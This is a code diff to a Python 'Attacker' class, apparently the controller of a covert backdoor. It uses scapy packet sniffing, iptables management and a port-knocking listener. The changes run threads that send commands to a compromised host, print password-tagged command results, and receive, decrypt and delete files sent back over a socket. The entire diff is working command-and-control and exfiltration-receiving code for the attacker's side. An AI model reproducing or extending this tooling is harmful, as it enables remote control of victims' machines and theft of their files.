@@ -8,6 +8,7 @@ import helpers
 import iptablesManager
 
 logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
+CHUNK_SIZE = 16
 BUFSIZE = 1024
 
 """
@@ -34,21 +35,22 @@ class Attacker(object):
 
     def run(self):
         helpers.checkRootPrivilege()
+
+        send_command_thread = threading.Thread(target=self.sendCommand)
+        send_command_thread.setDaemon(True)
+        send_command_thread.start()
+
+        listen_thread = threading.Thread(target=self.listen)
+        listen_thread.setDaemon(True)
+        listen_thread.start()
+
+        knock_listener_thread = threading.Thread(target=self.knockListener)
+        knock_listener_thread.setDaemon(True)
+        knock_listener_thread.start()
+
         try:
-            send_command_thread = threading.Thread(target=self.sendCommand)
-            send_command_thread.setDaemon(True)
-            send_command_thread.start()
-
-            listen_thread = threading.Thread(target=self.listen)
-            listen_thread.setDaemon(True)
-            listen_thread.start()
-
-            send_command_thread.join()
-            listen_thread.join()
-
             while threading.active_count() > 0:
                 time.sleep(0.1)
-
         except KeyboardInterrupt:
             print('Attacker closed...\n')
             sys.exit(0)
@@ -91,7 +93,7 @@ class Attacker(object):
         if password not in self.password:
             return
         else:
-            print("Result: %s" % result)
+            print("Result:\n%s" % result)
 
     def isIncoming(self, packet):
         """
@@ -136,21 +138,18 @@ class Attacker(object):
         conn, addr = sock.accept()
         print("Receive connection from {}".format(addr))
 
-        filename = "encrypted_file.txt"
-        encryptedFile = open(filename, "wb")
-        while True:
-            data = conn.recv(BUFSIZE)
+        dummyFile = "received_data.txt"
+        with open(dummyFile, 'wb') as receivedData:
+            while True:
+                data = conn.recv(BUFSIZE)
 
-            if data.endswith("EOF"):
-                data = data[:-3]
-                encryptedFile.write(data)
-                break
+                if data.endswith("EOF"):
+                    data = data[:-3]
+                    receivedData.write(data)
+                    break
+                receivedData.write(data)
 
-            encryptedFile.write(data)
-
-        encryptedFile.close()
         conn.close()
-
-        encryption.decryptFile(filename)
-        os.remove(filename)
-        print("Done!")
+        encryption.decryptFile(dummyFile)
+        os.remove(dummyFile)
+        print("Done receiving!")
